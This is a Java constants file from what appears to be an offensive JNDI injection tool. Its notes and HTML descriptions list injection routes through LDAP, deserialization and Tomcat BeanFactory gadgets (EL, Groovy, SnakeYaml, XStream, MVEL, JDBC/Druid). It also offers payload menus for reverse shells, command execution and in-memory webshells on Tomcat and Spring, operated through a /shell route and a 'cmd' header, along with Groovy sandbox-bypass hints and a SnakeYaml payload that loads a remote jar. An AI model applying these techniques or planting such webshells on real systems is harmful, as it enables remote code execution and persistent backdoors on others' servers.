package net.roboterh.injector.utils;

public interface ConstantUtil {

    // notes clicked
    String WaysNote = "JNDI注入的方式暂时大致可以分为下面三类\n\t1.基础版的JNDI注入\n\t2.使用反序列化的方式绕过限制\n\t3.使用已知组件的绕过方式";
    String PayloadNote = "根据前面选择的不同的注入方式来进行不同的Payload选择";

    // notes suspend
    String BasicNote = "简单的一个ldap服务";
    String DeserializationNote = "通过ldap服务返回一个序列化数据";
    String TomcatNote = "需要具有Tomcat依赖";
    String TomcatElNote = "需要具有Tomcat and EL-api依赖";
    String TomcatGroovyNote = "需要具有Tomcat and Groovy依赖";
    String TomcatSnakeYamlNote = "需要具有Tomcat and SnakeYaml依赖";
    String TomcatXStreamNote = "需要具有Tomcat and XStream依赖";
    String TomcatMVELNote = "需要具有Tomcat and MVEL依赖";
    String TomcatCommonsConfigurationNote = "需要具有Tomcat and commons-configuration/commons-configuration2";
    String TomcatOrDruidJdbcNote = "需要具有tomcat-dbcp/commons-dbcp/tomcat-jdbc/Druid and JDBC Driver依赖";

    String DnsLogNote = "发送dns查询请求";
    String CommandNote = "直接执行命令";
    String ReverseShellNote = "通过反弹shell的方式";
    String FileNote = "获取data目录下的脚本文件进行执行";
    String JavaFileNote = "获取一个内存马注入的模板内容，内置了Servlet等常见内存马\n这里是为了方便更好的自定义";
    String TomcatEchoNote = "一个在Tomcat环境下的回显马\n1.通过cmd这个header头进行传参";
    String TomcatServletNote = "一个在Tomcat环境下的Servlet内存马\n1.创建的Servlet路由是/shell\n2.通过cmd这个header头传参\n3.servletName是roboterh";
    String TomcatListenerNote = "一个在Tomcat环境下的Listener内存马\n1.通过cmd这个header头传参";
    String TomcatFilterNote = "一个在Tomcat环境下的Filter内存马\n1.创建的Filter路由是/*\n2.通过cmd这个header头传参\n3.filterName是roboterh";
    String TomcatExecutorNote = "一个在Tomcat环境下的Executor层上的内存马\n1.通过cmd这个header头传参";
    String TomcatUpgradeNote = "一个在Tomcat环境下的Upgrade层上的内存马\n1.需要在header头中添加Connection: Upgrade\n2.通过cmd这个header头传参";
    String TomcatValveNote = "一个在Tomcat环境下的Valve内存马\n1.通过cmd这个header头进行传参";
    String TomcatWebsocketNote = "一个在Tomcat环境下的websocket这个全双工协议上的内存马\n1.创建的路由是/shell\n2.直接进行websocket通信进行传参";
    String SpringControllerNote = "一个在Spring环境下的Controller型内存马\n1.创建的Controller路由是/shell\n2.通过cmd这个header头传参";
    String SpringInterceptorNote = "一个在Spring环境下的Interceptor型内存马\n1.通过cmd这个header头传参";
    String SpringEchoNote = "一个在Spring环境下的回显马\n1.通过cmd这个header头传参";

    // payload with different ways of JNDI
    String[] BasicPayload = {"Command", "DnsLog"};
    String[] DeserializationPayload = {"URLDNS", "JDK8u20"};
    String[] TomcatPayload = {"XXE"};
    String[] TomcatELPayload = {"Command", "DnsLog", "ReverseShell", "File", "JavaFile", "TomcatEcho", "TomcatExecutor", "TomcatFilter"
            , "TomcatListener", "TomcatServlet", "TomcatUpgrade", "TomcatValve", "TomcatWebsocket", "SpringController", "SpringEcho"
            , "SpringInterceptor"};
    String[] TomcatGroovyPayload = {"Command", "DnsLog", "File", "JavaFile", "TomcatEcho", "TomcatExecutor", "TomcatFilter"
            , "TomcatListener", "TomcatServlet", "TomcatUpgrade", "TomcatValve", "TomcatWebsocket", "SpringController", "SpringEcho"
            , "SpringInterceptor"};
    String[] TomcatSnakeYamlPayload = {"Command", "DnsLog", "File"};
    String[] TomcatXStreamPayload = {"Command", "File"};
    String[] TomcatMVELPayload = {"Command", "File"};
    String[] TomcatCommonsConfigurationPayload = {"BeanFactory", "GenericNamingResourcesFactory"};
    String[] TomcatOrDruidJdbcPayload = {"H2", "Mysql"};

    // description of different way
    String BasicDescription = "<html>Basic way<br>" +
            "Requirement:<br>" +
            "&nbsp;&nbsp;com.sun.jndi.ldap.object.trustURLCodebase = true<br>" +
            "Explanation:<br>" +
            "&nbsp;&nbsp;set attribution `javaCodeBase` to remote server, and we can obtain particular class</html>";
    String DeserializationDescription = "<html>Deserialization Way:<br>" +
            "    Requirement:<br>" +
            "    &nbsp;&nbsp;There is a deserialization vulnerability in the remote server<br>" +
            "    Explanation:<br>" +
            "    &nbsp;&nbsp;Set the attribute `javaSerializedData` to serialized data, and the data will be deserialized.<br>" +
            "    &nbsp;&nbsp;As a result, we can execute arbitrary command.</html>";
    String TomcatDescription = "<html>Tomcat Way:<br>" +
            "    Requirement:<br>" +
            "    &nbsp;&nbsp;Tomcat in classpath<br>" +
            "    Explanation:<br>" +
            "    &nbsp;&nbsp;The class org.apache.catalina.users.MemoryUserDatabaseFactory which implement interface<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;`javax.naming.spi.ObjectFactory` and the method getObjectInstance exists<br>" +
            "    &nbsp;&nbsp;There is a XXE in this method</html>";
    String TomcatCommonsConfigurationDescription = "<html>Tomcat CommonsConfiguration Way:<br>" +
            "    Requirement:<br>" +
            "    &nbsp;&nbsp;Tomcat/tomcat-jdbc.jar and CommonsConfiguration/CommonsConfiguration2 in classpath<br>" +
            "    Explanation:<br>" +
            "    &nbsp;&nbsp;The class named `org.apache.commons.configuration.SystemConfiguration` or `org.apache.commons.configuration2.SystemConfiguration`<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;is an eligible beanClass. And the method of beanClass named `setSystemProperties` will load a local or remote file<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;which content consists of key-value separated by an equal sign. Particularly, the systematic properties will be covered<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;by these attributions.<br>" +
            "<br>" +
            "    &nbsp;&nbsp;In another way, there is a factory named `org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory`<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;in tomcat-jdbc.jar. In the getObjectInstance method of this factory, it will add `set` to key directly. Such<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;as the input is systemProperties, and the output is setSystemProperties.</html>";
    String TomcatELDescription = "<html>Tomcat EL Way:<br>" +
            "    Requirement:<br>" +
            "    &nbsp;&nbsp;Tomcat 8+(catalina and el-api) or springboot1.2.x+ in classpath<br>" +
            "    Explanation:<br>" +
            "    &nbsp;&nbsp;1. set javaSerializedData to Serialized ResourceRef-object<br>" +
            "    &nbsp;&nbsp;2. call NamingManger#getObjectInstance when ldap-client calls lookup<br>" +
            "    &nbsp;&nbsp;3. call getObjectFactoryFromReference in function getObjectInstance to get the factory from Ref<br>" +
            "    &nbsp;&nbsp;4. call org.apache.naming.factory.BeanFactory#getObjectInstance<br>" +
            "    &nbsp;&nbsp;5. call setter method</html>";
    String TomcatGroovyDescription = "<html>Tomcat Groovy Way:<br>" +
            "    Requirement:<br>" +
            "    &nbsp;&nbsp;Tomcat and Groovy in classpath<br>" +
            "    Explanation:<br>" +
            "    &nbsp;&nbsp;There are many ways to execute groovy script, such as<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;1. groovy.lang.GroovyClassLoader#parseClass<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;2. groovy.lang.GroovyClassLoader#addClasspath and loadClass to load remote class<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;3. groovy.lang.GroovyShell#evaluate<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;4. groovy.lang.GroovyShell#parse<br>" +
            "<br>" +
            "    &nbsp;&nbsp;normal payload:<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;`script`.execute()<br>" +
            "    &nbsp;&nbsp;bypass sandbox:<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;1. ASTTest http://groovy-lang.org/metaprogramming.html#xform-ASTTest<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;2. GrabConfig http://docs.groovy-lang.org/latest/html/documentation/grape.html#Grape-SpecifyAdditionalRepositories</html>";
    String TomcatMVELDescription = "<html>Tomcat MVEL Way:<br>" +
            "    Requirement:<br>" +
            "    &nbsp;&nbsp;Tomcat and MVEL in classpath<br>" +
            "    Explanation:<br>" +
            "    &nbsp;&nbsp;There will determine what method will be called in org.mvel2.sh.ShellSession#exec<br>" +
            "    &nbsp;&nbsp;There is a calling (MVEL#eval) in PushContext#execute</html>";
    String TomcatOrDruidJdbcDescription = "<html>TomcatOrDruidJdbc Way:<br>" +
            "    Requirement:<br>" +
            "    &nbsp;&nbsp;dbcp1_tomcat / dbcp2_tomcat / commons-dbcp2  /commons-dbcp1 in classpath<br>" +
            "    &nbsp;&nbsp;particular jdbc drivers in classpath<br>" +
            "    &nbsp;&nbsp;There are other factories playing the same role<br>" +
            "    &nbsp;&nbsp;&nbsp;&nbsp;tomcat-jdbc / druid in classpath<br>" +
            "    Explanation:<br>" +
            "    &nbsp;&nbsp;Once the attribute `initialSize` more than the 0, the method `getLogWriter` will be called.<br>" +
            "    &nbsp;&nbsp;Then it could build a connection of JDBC<br>" +
            "<br>" +
            "    &nbsp;&nbsp;Particularly, the payload of DruidJDBC way is different from other payloads. The difference is that<br>" +
            "    &nbsp;&nbsp;it would add an attribute named init as `true`</html>";
    String TomcatSnakeYamlDescription = "<html>Tomcat SnakeYaml Way:<br>" +
            "    Requirement:<br>" +
            "    &nbsp;&nbsp;Tomcat and SnakeYaml in classpath<br>" +
            "    Explanation:<br>" +
            "    &nbsp;&nbsp;load malicious .yml file to execute particular code using method org.yaml.snakeyaml.Yaml#load<br>" +
            "    &nbsp;&nbsp;the payload is<br>" +
            "        &nbsp;&nbsp;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1/a.jar\"]]]]<br>" +
            "    &nbsp;&nbsp;load the class which is content of services/javax.script.ScriptEngineFactory by SPI</html>";
    String TomcatXStreamDescription = "<html>Tomcat XStream Way:<br>" +
            "    Requirement:<br>" +
            "    &nbsp;&nbsp;Tomcat and XStream < 1.4.17 in classpath<br>" +
            "    Explanation:<br>" +
            "    &nbsp;&nbsp;call com.thoughtworks.xstream.XStream#fromXML to load malicious xml</html>";
}
